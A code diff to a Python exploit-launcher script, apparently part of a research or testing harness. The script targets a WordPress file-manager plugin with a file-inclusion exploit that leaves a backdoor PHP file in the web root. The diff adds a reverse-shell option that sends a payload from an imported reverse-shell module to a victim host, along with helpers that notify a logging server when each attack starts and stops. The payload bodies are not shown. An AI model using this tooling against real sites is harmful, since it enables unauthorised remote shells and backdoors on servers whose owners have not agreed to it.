@@ -1,4 +1,4 @@
-import os, sys
+import os, sys, time
 import my_reverse_shell
 import requests
 from datetime import datetime
@@ -82,6 +82,17 @@ def wp_file_manager(victim_info, attacker_info, general_info, exp, arguments):
 					print(color.GREEN + '\n[+] End of File Inclusion exploit.\n    Leaving Script!' + color.END)
 					if arguments.repeat != None:
 						print(color.GREEN + '\n[*] If you own the target webserver check the website root folder\n    You should find there a file called possible_backdoor.php\n    It is a simple PoC.' + color.END)
+			case 7:
+				if arguments.repeat != None:
+					print(color.BLUE + "Reverse Shell" + color.END + color.BOLD + ">" + color.END)
+				start_logging(general_info)
+				time.sleep(1)
+				send_rev(attacker_info, victim_info)
+				time.sleep(1)
+				stop_logging(general_info)
+				if i == k-1:
+					print(color.GREEN + '\n[+] End of Reverse Shell logging.\n    Leaving Script!' + color.END)
+			
 			case default:
 				sys.exit(color.RED + "Something went wrong, invalid exploit" + color.END)
 		
@@ -120,3 +131,24 @@ def send_rev(attacker_info, victim_info):
 	print(color.GREEN + '[*]' + color.END + ' Sending the payload...')
 	launch_exploit(attacker_info, victim_info)
 
+def start_logging(general_info):
+	exploit = 'ReverseShell'
+
+	url = general_info['host'] + ':' + general_info['port'] + '/start?exploit=' + exploit 
+	try:
+		requests.get('http://'+ url, timeout=(1,1)) 
+	except requests.exceptions.ReadTimeout:
+		pass
+	except requests.exceptions.ConnectTimeout:
+		sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
+
+def stop_logging(general_info):
+	exploit = 'ReverseShell'
+
+	url = general_info['host'] + ':' + general_info['port'] + '/stop?exploit=' + exploit 
+	try:
+		requests.get('http://'+ url, timeout=(1,1)) 
+	except requests.exceptions.ReadTimeout:
+		pass
+	except requests.exceptions.ConnectTimeout:
+		sys.exit(color.RED + '[-] Failed to connect to Logging server' + color.END)
